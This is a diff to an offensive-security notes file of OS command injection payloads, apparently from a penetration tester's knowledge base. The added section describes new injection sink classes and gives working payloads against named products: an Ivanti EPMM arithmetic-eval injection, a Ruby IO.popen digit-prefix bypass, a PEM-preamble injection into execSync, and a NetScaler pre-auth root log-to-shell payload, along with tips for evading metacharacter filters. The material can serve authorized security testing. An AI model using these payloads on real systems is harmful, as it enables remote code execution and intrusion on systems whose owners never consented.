@@ -4,7 +4,7 @@ type: payloads
 tags: [payloads, command-injection, rce, web]
 sources: [hacktricks-linux]
 date_created: 2026-06-16
-date_updated: 2026-06-30
+date_updated: 2026-11-09
 ---
 
 # Payloads: OS Command Injection
@@ -183,3 +183,25 @@ Notes:
   RCE, a meterpreter port-forward to the loopback service is often flakier than hitting it in-place.
 
 <!-- promoted-slug: internal-root-jobservice-tar-injection -->
+
+## NEW 2025-2026 sink classes (no metachars required)
+
+- **Arithmetic-eval sinks**: params stored in globals then compared in bash
+  `[[ $a -gt $b ]]` / `let` / `$(( ))` get double-expanded; the payload looks
+  like an identifier so metachar filters never fire. Ivanti EPMM shape:
+  `?st=theValue&h=gPath['sleep 5']` (5s delay then 404 = vulnerable).
+- **Numeric-prefix partial validation**: value must start with a digit before
+  Ruby `IO.popen`: `saml_id=1%26http://$(whoami)` (keep the `1`, encode `&`,
+  `$()` lands the result in the response).
+- **PEM preamble (RFC 7468)**: parsers keep the explanatory-text preamble
+  verbatim and a later service interpolates it into `execSync`/backticks:
+  intermediate cert = `'$(id > /out.txt 2>&1)\n' + ca_pem` (the stored
+  intermediate survives re-serialization, the leaf does not).
+- **Second-order log -> shell**: injection lands in a log; a privileged
+  parser (grep|tail|sed|awk, cron, incron, Logstash) interpolates a field
+  into a later shell command (NetScaler pre-auth root:
+  `NSPPE-00;id>/tmp/proof;` riding a `find /var/core -name` reader). An
+  immediate HTTP response is NOT the proof; trace writer -> reader -> sink.
+
+Full separator/keyword/space ladder + defense->bypass table:
+`skills/exploit/hunt/hunt-rce/references/bypass-arsenal.md`.
